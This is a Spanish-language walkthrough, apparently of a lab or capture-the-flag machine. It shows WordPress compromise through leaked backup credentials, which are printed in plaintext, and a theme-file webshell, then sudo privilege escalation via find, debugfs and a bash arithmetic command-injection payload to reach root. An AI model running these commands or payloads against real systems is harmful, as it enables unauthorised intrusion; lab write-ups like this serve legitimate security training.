PORT   STATE SERVICE
80/tcp open  http

-Tenemos un WordPress 6.5.4

-Hacemos fuzzing a la raiz y encontramos un directorio /backups , dónde hay un archivo .zip

-Nos lo descargamos y dentro hay unas credenciales

-Nos vamos a /wp-admin y nos autenticamos
	| Username  |         Password        |
      │ |-----------|-------------------------|
      │ | developer | 2wmy3KrGDRD%RsA7Ty5n71L^|
	   |-----------|-------------------------|

-Editamos el template footer.php con una reverse shell o una webshell:
	Tools --> Theme Editor --> Patterns --> Footer.php

-Lo ejecutamos desde /wp-content/themes/twentytwentyfour/patterns/footer.php

www-data@c4f36e09ab35:/

## Escalada de Privilegios

www-data@c4f36e09ab35:/ sudo -l:
	(rafa) /usr/bin/find	
	-sudo -u rafa find . -exec /bin/sh \; -quit
	rafa@c4f36e09ab35:/

rafa@c4f36e09ab35:/ sudo -l
	(ruben)  /usr/bin/debugfs
	sudo -u ruben debugfs
	!/bin/sh
	ruben@c4f36e09ab35:/

rafa@c4f36e09ab35:/ sudo -l 
	(ALL) NOPASSWD: /bin/bash /opt/penguin.sh

-Contenido de /opt/penguin.sh
	#!/bin/bash
	read -rp "Enter guess: " num
	if [[ $num -eq 42 ]]
	then
	  echo "Correct"
	else
	  echo "Wrong"

-El script presenta la vulnerabilidad eq de bash , ejecutamos el script como root y la explotamos para escalar a root:
	-sudo /bin/bash /opt/penguin.sh 
		Enter guess: bash a[$(/bin/sh >&2)]+42
		root@c4f36e09ab35:/# whoami
		root

